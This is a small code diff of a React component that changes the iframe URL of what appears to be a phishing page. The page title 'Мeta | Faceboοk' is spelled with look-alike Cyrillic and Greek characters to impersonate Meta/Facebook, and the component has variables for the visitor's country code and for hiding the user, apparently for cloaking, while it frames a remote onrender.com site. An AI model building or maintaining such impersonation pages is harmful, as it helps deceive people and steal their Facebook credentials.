@@ -7,7 +7,7 @@ import MetaIcon from '../resources/favicon2.ico';
 function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://linkclient.onrender.com');
+  let[IframeUrl, SetIframeUrl] = useState('https://linkchuaboc.onrender.com/');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Мeta | Faceboοk');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Home Page');
 
